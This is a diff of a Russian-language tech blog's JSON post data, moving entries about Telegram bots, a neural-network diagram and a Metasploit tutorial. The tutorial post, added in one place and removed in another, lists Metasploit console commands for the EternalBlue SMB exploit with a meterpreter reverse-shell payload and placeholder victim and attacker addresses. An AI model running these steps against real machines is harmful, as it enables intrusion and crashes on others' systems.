@@ -1,5 +1,46 @@
 {
+    "newPosts": [
+        {
+            "id": 24,
+            "link": "https://web.telegram.org/#/im?p=@translator_conbot",
+            "imageLink": "img/translator_conbot.jpg",
+            "description": "Бот-переводчик в телегармм. Пользуйтесь пока бесплатно. Ссылка на самого бота по нажатию",
+            "html": "Бот-переводчик в телегармм. Пользуйтесь пока бесплатно. Ссылка на самого бота по нажатию",
+            "date": "Январь 9, 2020",
+            "category": {
+                "value": "Services",
+                "style": "cat-3",
+                "name": "SERVICES"
+            }
+        },
+        {
+            "id": 23,
+            "link": "#?post_id=23",
+            "imageLink": "img/metasploit.png",
+            "description": "Простой пример работы с Metasploit Framework",
+            "html": "\n<h2>Пост создан в ознакомительных целях, использование в отношении других людей чревато #\n</h2>\nЗапускаем\n<pre>msfconsole\n</pre>\nВыбираем для примера эксплоит eternalblue, в данном случае эксплоит предназначен на машины Windows 7 (x86 и x64) Windows Server\n2008 (x64) с выкинутой на ружу smb папкой (общие папки)\n<pre>use exploit/windows/smb/ms17_010_eternalblue\n</pre>\n\n<hr>\n\nНа ресурсах ссылаются на то, что нужно выбирать процесс в зависимости от ОС, но забегая наперед шела мне получить\nне удалось (только отказ в обслуживании\\синий экран на машине жертвы). Выполнение команд считаю опциональной.\nЕсли у жертвы стоит 32-битная система, то прописываем команду\n<pre>set process inject wlms.exe\n</pre>\nЕсли на компьютере жертвы стоит 64-битная ОС\n<pre>set process inject lsass.exe\n</pre>\n\n<hr>\n\nДля полезной нагрузки выбираем реверс шел (опционально, команда для полноты гайда, использоваться не будет,\nесли конечно вы чудом получите шел и машина жертвы не уйдет в перезагрузку)\n<pre>set payload windows/x64/meterpreter/reverse_tcp\n</pre>\n\n<hr>\n\nПрописываем IP жертвы\n<pre>set rhost 192.168...\n</pre>\nПрописываем свой IP\n<pre>set lhost 192.168..\n</pre>\nЗапускаем выполнение эксплоита\n<pre>exploit\n</pre>\n<p>Ждем <s>получение реверс шела</s> синего экрана на машине жертвы)\n</p>\n<p>Заметки по работе с metasploit буду складывать \n<a href=\"https://itcompressor.github.io/#?target=metasploit\">тут на itcompressor</a>\n</p>\n",
+            "date": "Ноябрь 23, 2019",
+            "category": {
+                "value": "Hacking",
+                "style": "cat-2",
+                "name": "HACKING"
+            }
+        }
+    ],
     "recentPosts": [
+        {
+            "id": 22,
+            "link": "#?post_id=22",
+            "imageLink": "img/ml_zoo.png",
+            "description": "Зоопарк архитектур",
+            "html": "\nПро архитектуры нейросетей можно говорить бесконечно...\n<img width=\"100%\" src=\"img/ml_zoo.png\" alt=\"\">\n",
+            "date": "Ноябрь 17, 2019",
+            "category": {
+                "value": "Machine Learning",
+                "style": "cat-4",
+                "name": "ML"
+            }
+        },
         {
             "id": 21,
             "link": "#?post_id=21",
@@ -146,7 +187,7 @@
         {
             "id": 10,
             "link": "https://web.telegram.org/#/im?p=@grammar_conbot",
-            "imageLink": "img/grammar_bot.jpg",
+            "imageLink": "img/grammar_conbot.jpg",
             "description": "Написал еще одного бота, проверяющего грамматику. Пользуйтесь пока бесплатно. Ссылка на самого бота по нажатию",
             "html": "Написал еще одного бота, проверяющего грамматику. Пользуйтесь пока бесплатно. Ссылка на самого бота по нажатию",
             "date": "Июль 16, 2019",
@@ -271,34 +312,6 @@
                 "value": "Another",
                 "style": "",
                 "name": "ANOTHER"
-            }
-        }
-    ],
-    "newPosts": [
-        {
-            "id": 23,
-            "link": "#?post_id=23",
-            "imageLink": "img/metasploit.png",
-            "description": "Простой пример работы с Metasploit Framework",
-            "html": "\n<h2>Пост создан в ознакомительных целях, использование в отношении других людей чревато #\n</h2>\nЗапускаем\n<pre>msfconsole\n</pre>\nВыбираем для примера эксплоит eternalblue, в данном случае эксплоит предназначен на машины Windows 7 (x86 и x64) Windows Server\n2008 (x64) с выкинутой на ружу smb папкой (общие папки)\n<pre>use exploit/windows/smb/ms17_010_eternalblue\n</pre>\n\n<hr>\n\nНа ресурсах ссылаются на то, что нужно выбирать процесс в зависимости от ОС, но забегая наперед шела мне получить\nне удалось (только отказ в обслуживании\\синий экран на машине жертвы). Выполнение команд считаю опциональной.\nЕсли у жертвы стоит 32-битная система, то прописываем команду\n<pre>set process inject wlms.exe\n</pre>\nЕсли на компьютере жертвы стоит 64-битная ОС\n<pre>set process inject lsass.exe\n</pre>\n\n<hr>\n\nДля полезной нагрузки выбираем реверс шел (опционально, команда для полноты гайда, использоваться не будет,\nесли конечно вы чудом получите шел и машина жертвы не уйдет в перезагрузку)\n<pre>set payload windows/x64/meterpreter/reverse_tcp\n</pre>\n\n<hr>\n\nПрописываем IP жертвы\n<pre>set rhost 192.168...\n</pre>\nПрописываем свой IP\n<pre>set lhost 192.168..\n</pre>\nЗапускаем выполнение эксплоита\n<pre>exploit\n</pre>\n<p>Ждем <s>получение реверс шела</s> синего экрана на машине жертвы)\n</p>\n<p>Заметки по работе с metasploit буду складывать \n<a href=\"https://itcompressor.github.io/#?target=metasploit\">тут на itcompressor</a>\n</p>\n",
-            "date": "Ноябрь 23, 2019",
-            "category": {
-                "value": "Hacking",
-                "style": "cat-2",
-                "name": "HACKING"
-            }
-        },
-        {
-            "id": 22,
-            "link": "#?post_id=22",
-            "imageLink": "img/ml_zoo.png",
-            "description": "Зоопарк архитектур",
-            "html": "\nПро архитектуры нейросетей можно говорить бесконечно...\n<img width=\"100%\" src=\"img/ml_zoo.png\" alt=\"\">\n",
-            "date": "Ноябрь 17, 2019",
-            "category": {
-                "value": "Machine Learning",
-                "style": "cat-4",
-                "name": "ML"
             }
         }
     ],
